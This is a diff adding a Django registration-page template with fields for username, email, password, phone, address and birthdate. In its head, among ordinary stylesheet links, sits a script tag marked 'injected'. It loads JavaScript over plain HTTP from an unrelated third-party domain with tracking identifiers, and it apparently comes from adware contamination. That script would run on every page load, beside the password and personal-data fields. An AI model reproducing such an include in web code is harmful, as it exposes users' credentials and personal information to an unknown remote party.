@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    {%load static%}
+    <title>Register_Page</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <link rel="stylesheet" href="{%static "css/demo.css"%}">
+    <link rel="stylesheet" href="{%static "css/sky-forms.css"%}">
+    <script data-type="injected" src="http://www.technologieyvonlheureux.com/addon/script/content_site?integration=anywhere&v=n11.12.1.145&os_mj=10&os_mn=0&os_bitness=64&mid=7c68d81fa670e98c058fa950590eef5c&uid=CEA1EE1FEF7977FF31308BF859746287&aid=4770&aid2=none&ts=1480595379&ts2=&psd=true"></script>
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/3.1.0/css/font-awesome.css">
+</head>
+
+<body class="background_register">
+    <div class="body body-s">
+        <form action="" class="sky-form" method="post">
+            {% block content %}
+                {% csrf_token %} 
+            <header>Registration form</header>
+            <fieldset>
+                <section>
+                    <label class="input" for="{{form.username.id_for_label}}">
+                        <i class="icon-append icon-user"></i>
+                        {{ user_form.username }}
+                        <b class="tooltip tooltip-bottom-right">This is your account.Must Enter.</b>
+                    </label>
+                </section>
+                <section>
+                    <label class="input">
+                        <i class="icon-append icon-envelope-alt"></i>
+                        {{profile_form.email}}
+                        <b class="tooltip tooltip-bottom-right">Please Enter your email.</b>
+                    </label>
+                </section>
+                <section>
+                    <label class="input">
+                        <i class="icon-append icon-lock"></i>
+                        {{ user_form.password }}
+                        <b class="tooltip tooltip-bottom-right">Only latin characters and numbers</b>
+                    </label>
+                </section>
+                
+            </fieldset>
+            <fieldset>
+                <div class="row">
+                    <section class="col col-6">
+                        <label class="input">
+                            {{ profile_form.name }}
+                        </label>
+                    </section>
+                    <section class="col col-6">
+                        <label class="input">
+                            {{profile_form.telephone }}
+                        </label>
+                    </section>
+                </div>
+                <section>
+                    <label class="select">
+                        {{ profile_form.sex }}
+                    </label>
+                </section>
+                <section>
+                    <label class="input" placeholder="address">
+                        {{ profile_form.address }}
+                        <b class="tooltip tooltip-bottom-right">Only latin characters and numbers</b>
+                    </label>
+                </section>
+                <section>
+                    <label class="select" style="width:100%; display: inline-flex;">    
+                        {{profile_form.birthdate}}
+                    </label>
+                </section>
+                
+            </fieldset>
+            <footer>
+                <button type="submit" class="button">Register</button>
+                <a href="/accounts/login" class="button button-secondary">Login</a>
+                <input type="hidden" name="next" value="{{ next }}">
+            </footer>
+        {%endblock%}
+        </form>
+        
+    </div>
+</body>
+
+</html>
